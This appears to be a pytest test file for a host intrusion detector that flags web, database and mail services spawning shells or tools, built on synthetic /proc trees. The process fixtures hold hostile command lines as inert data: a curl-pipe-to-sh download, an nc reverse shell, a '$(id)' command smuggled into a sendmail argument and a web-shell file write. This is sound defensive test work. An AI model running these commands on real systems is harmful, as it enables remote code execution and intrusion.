"""Process ancestry: services that start shells or attack tools, over synthetic /proc trees and live."""
from __future__ import annotations

import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import threading
import time

import pytest

from megalodon import process_ancestry as anc
from megalodon import response_engine as re_

NOW = "2026-11-19T00:30:00Z"
linux = pytest.mark.skipif(not sys.platform.startswith("linux"), reason="reads /proc")


def proc(root, pid, ppid, exe, argv=(), comm=None, start=None):
    base = root / "proc" / str(pid)
    base.mkdir(parents=True)
    if exe:
        os.symlink(exe, base / "exe")
    name = comm or exe.rsplit("/", 1)[-1]
    fields = ["S", str(ppid)] + ["0"] * 17 + [str(start if start is not None else 1000 + pid)]
    (base / "stat").write_text(f"{pid} ({name}) {' '.join(fields)} 0 0\n")
    (base / "cmdline").write_bytes(b"\0".join(a.encode() for a in (argv or [exe])) + b"\0")


@pytest.fixture
def root(tmp_path):
    proc(tmp_path, 1, 0, "/usr/lib/systemd/systemd")
    proc(tmp_path, 10, 1, "/usr/sbin/nginx")
    proc(tmp_path, 11, 10, "/usr/sbin/nginx", comm="nginx")
    proc(tmp_path, 20, 1, "/usr/sbin/php-fpm8.2")
    proc(tmp_path, 30, 1, "/usr/sbin/apache2")
    proc(tmp_path, 40, 1, "/usr/lib/postgresql/16/bin/postgres")
    proc(tmp_path, 50, 1, "/usr/sbin/exim4")
    proc(tmp_path, 60, 1, "/usr/sbin/sshd")
    proc(tmp_path, 61, 60, "/usr/bin/bash", ["-bash"])
    return tmp_path


def rules(report):
    return {f["evidence"]["pid"]: (f["rule_id"], f["severity"]) for f in report["findings"]}


def test_services_starting_shells_and_tools_are_found(root):
    proc(root, 100, 11, "/usr/bin/dash", ["sh", "-c", "id; uname -a"])           # web shell command
    proc(root, 101, 100, "/usr/bin/id", ["id"])
    proc(root, 110, 40, "/usr/bin/dash", ["sh", "-c", "curl -s http://198.51.100.9/x | sh"])  # COPY ... PROGRAM
    proc(root, 111, 110, "/usr/bin/curl", ["curl", "-s", "http://198.51.100.9/x"])
    proc(root, 120, 50, "/usr/bin/dash", ["sh", "-c", "/home/u/.forward-hook"])   # mail: lower severity
    proc(root, 130, 61, "/usr/bin/id", ["id"])                                   # an admin's own shell
    report = anc.check(root, now=NOW)
    assert rules(report) == {100: ("SERVICE_SPAWNED_SHELL", "HIGH"), 101: ("SERVICE_SPAWNED_TOOL", "HIGH"),
                             110: ("SERVICE_SPAWNED_SHELL", "HIGH"), 111: ("SERVICE_SPAWNED_TOOL", "HIGH"),
                             120: ("SERVICE_SPAWNED_SHELL", "MEDIUM")}
    web = next(f for f in report["findings"] if f["evidence"]["pid"] == 101)
    assert web["attack"] == ["T1505.003", "T1082", "T1033"]
    assert web["evidence"]["service"] == {"program": "/usr/sbin/nginx", "category": "web", "pid": 11, "start": 1011}
    assert web["evidence"]["chain"][:3] == ["/usr/bin/dash", "/usr/sbin/nginx", "/usr/sbin/nginx"]
    assert web["evidence"]["processes"] == [{"program": "/usr/bin/id", "pid": 101, "start": 1101}]


def test_what_services_legitimately_run_stays_quiet(root):
    proc(root, 200, 20, "/usr/bin/dash", ["sh", "-c", "/usr/sbin/sendmail -t -i"])     # PHP mail()
    proc(root, 201, 200, "/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"])
    proc(root, 210, 30, "/usr/bin/dash", ["/bin/sh", "-c", "/usr/bin/rotatelogs /var/log/a 86400"])
    proc(root, 220, 30, "/usr/bin/perl", ["/usr/bin/perl", "/usr/lib/cgi-bin/status.pl"])   # CGI
    proc(root, 230, 40, "/usr/lib/postgresql/16/bin/postgres", ["postgres: checkpointer"])
    assert anc.check(root, now=NOW)["findings"] == []


def test_a_helper_with_shell_syntax_or_a_script_outside_cgi_is_not_excused(root):
    proc(root, 300, 20, "/usr/bin/dash", ["sh", "-c", "/usr/sbin/sendmail -t; nc 203.0.113.5 4444 -e sh"])
    proc(root, 310, 30, "/usr/bin/perl", ["/usr/bin/perl", "/var/www/html/uploads/x.pl"])
    proc(root, 320, 30, "/usr/bin/dash", ["sh", "-c", "sendmail $(id)"])
    assert set(rules(anc.check(root, now=NOW))) == {300, 310, 320}


def test_an_allowed_pair_is_recorded_owner_only_and_respected(root, tmp_path):
    proc(root, 400, 40, "/usr/bin/dash", ["sh", "-c", "cp pg_wal/000001 /archive/000001"])  # archive_command
    allow = tmp_path / "config" / "ancestry-allow.json"
    assert set(rules(anc.check(root, allow_path=allow, now=NOW))) == {400}
    assert anc.allow(allow, "/usr/lib/postgresql/16/bin/postgres", "/usr/bin/dash") == 1
    assert oct(allow.stat().st_mode & 0o777) == "0o600"
    assert anc.check(root, allow_path=allow, now=NOW)["findings"] == []
    os.chmod(allow, 0o666)
    with pytest.raises(anc.AncestryError, match="writable only by you"):
        anc.check(root, allow_path=allow, now=NOW)
    with pytest.raises(anc.AncestryError, match="absolute"):
        anc.allow(allow, "postgres", "/usr/bin/dash")


class Events:
    def __init__(self, items):
        self.items = list(items)

    def events(self, timeout):
        out, self.items = self.items, []
        return out

    def close(self):
        pass


def test_the_watch_follows_parents_that_already_exited(root):
    # nginx forks a shell that runs `(id &)`: the shell and its subshell are gone when id is examined,
    # and id now shows init as its parent. The fork events still lead back to nginx.
    found = []
    proc(root, 500, 11, "/usr/bin/dash", ["sh", "-c", "(id &)"])
    watcher = anc.Watcher(found.append, root=root, source=Events([]))
    watcher.handle("fork", 500, 11)
    watcher.handle("exec", 500, 0)
    watcher.handle("fork", 501, 500)
    watcher.handle("fork", 502, 501)
    shutil.rmtree(root / "proc/500")
    proc(root, 502, 1, "/usr/bin/id", ["id"])
    watcher.handle("exec", 502, 0)
    assert [(f["rule_id"], f["evidence"]["pid"]) for f in found] == [
        ("SERVICE_SPAWNED_SHELL", 500), ("SERVICE_SPAWNED_TOOL", 502)]
    assert found[1]["evidence"]["service"]["program"] == "/usr/sbin/nginx"
    # The same command again within the cooldown is reported once.
    watcher.handle("exec", 502, 0)
    assert len(found) == 2 and watcher.stats["findings"] == 2


def test_a_reused_pid_is_not_taken_for_the_parent_that_exited(root):
    found = []
    proc(root, 600, 11, "/usr/bin/dash", ["sh", "-c", "x"], start=7000)
    watcher = anc.Watcher(found.append, root=root, source=Events([]))
    watcher.handle("exec", 600, 0)
    shutil.rmtree(root / "proc/600")
    proc(root, 600, 61, "/usr/bin/bash", ["bash"], start=9999)           # PID 600 reused under sshd
    watcher.handle("fork", 601, 600)
    proc(root, 601, 600, "/usr/bin/id", ["id"])
    watcher.handle("exec", 601, 0)
    # 601's parent is the new process 600 (an admin shell): nothing to report.
    assert [f["evidence"]["pid"] for f in found] == [600]


def test_watch_findings_become_targeted_shadow_decisions(root, tmp_path):
    proc(root, 700, 11, "/usr/bin/dash", ["sh", "-c", "id"], start=424242)
    line = json.dumps(anc.check(root, now=NOW)["findings"][0])
    policy = tmp_path / "policy.toml"
    re_.write_default_policy(policy)
    signals, refused = re_.ingest_signals([line], re_._now())
    assert refused == 0
    result = re_.run(policy_path=policy, ledger=tmp_path / "ledger.jsonl", state_path=tmp_path / "state.json",
                     signals=signals, protected=set())
    decision = json.loads((tmp_path / "ledger.jsonl").read_text().splitlines()[0])
    assert result["decisions"] == 1 and decision["playbook"] == "web-shell-or-exploited-service"
    planned = {(a["action"], a["target"], a["status"]) for a in decision["actions"]}
    assert ("suspend_process", "700@424242:/usr/bin/dash", "would_apply") in planned
    assert not any(a["target"] == "/usr/bin/dash" for a in decision["actions"]), "never every dash process"


@linux
def test_a_live_service_starting_a_shell_is_caught(tmp_path):
    service = tmp_path / "nginx"
    shutil.copy("/bin/bash", service)
    found = []
    watcher = anc.Watcher(found.append, interval=0.05)
    stop = threading.Event()
    worker = threading.Thread(target=watcher.run, args=(stop,), kwargs=dict(timeout=0.1), daemon=True)
    worker.start()
    try:
        time.sleep(0.3)
        subprocess.run([str(service), "-c", "/bin/sh -c 'sleep 0.6; /usr/bin/id >/dev/null; sleep 0.6'; true"],
                       check=True)
        time.sleep(0.5)
    finally:
        stop.set()
        worker.join(5)
        watcher.close()
    mine = [f for f in found if f["evidence"]["service"]["program"] == str(service)]
    assert ("SERVICE_SPAWNED_SHELL", "HIGH") in {(f["rule_id"], f["severity"]) for f in mine}, watcher.mode
    if watcher.mode == "process events":
        assert "SERVICE_SPAWNED_TOOL" in {f["rule_id"] for f in mine}, "every exec is seen"


def test_cli_allow_and_check(tmp_path, capsys):
    from megalodon.cli import main
    allow = tmp_path / "allow.json"
    with pytest.raises(SystemExit) as exit_:
        main(["ancestry", "allow", "--allow-file", str(allow), "/usr/sbin/nginx", "/usr/bin/dash"])
    assert exit_.value.code == 0 and json.loads(capsys.readouterr().out)["allowed"] == 1
    with pytest.raises(SystemExit) as exit_:
        main(["ancestry", "allow", "--allow-file", str(allow), "nginx", "/usr/bin/dash"])
    assert exit_.value.code == 2


def test_code_passed_as_a_string_never_counts_as_a_cgi_script(root):
    # The CGI exemption is for an interpreter given a script file, not `-c`/`-e` code that starts with a path.
    proc(root, 800, 30, "/usr/bin/dash", ["sh", "-c", "/usr/lib/cgi-bin/status; echo x > /var/www/html/b.php"])
    proc(root, 801, 30, "/usr/bin/perl", ["/usr/bin/perl", "-e", "/usr/lib/cgi-bin/x.pl"])
    proc(root, 802, 30, "/usr/bin/perl", ["/usr/bin/perl", "/usr/lib/cgi-bin/x.pl; id"])
    proc(root, 803, 30, "/usr/bin/perl", ["/usr/bin/perl", "-T", "/usr/lib/cgi-bin/status.pl"])   # real CGI
    assert set(rules(anc.check(root, now=NOW))) == {800, 801, 802}


def test_without_fork_events_a_reused_service_pid_is_not_blamed(root):
    # Polling mode: PHP-FPM was seen at PID 20, then sshd took the PID. A login shell under sshd is not PHP-FPM's.
    found = []
    watcher = anc.Watcher(found.append, root=root, source=Events([]))
    watcher.handle("exec", 20, 0)
    shutil.rmtree(root / "proc/20")
    proc(root, 20, 1, "/usr/sbin/sshd", start=99999)
    proc(root, 21, 20, "/usr/bin/bash", ["-bash"], start=100000)
    watcher.handle("exec", 21, 0)
    assert found == []
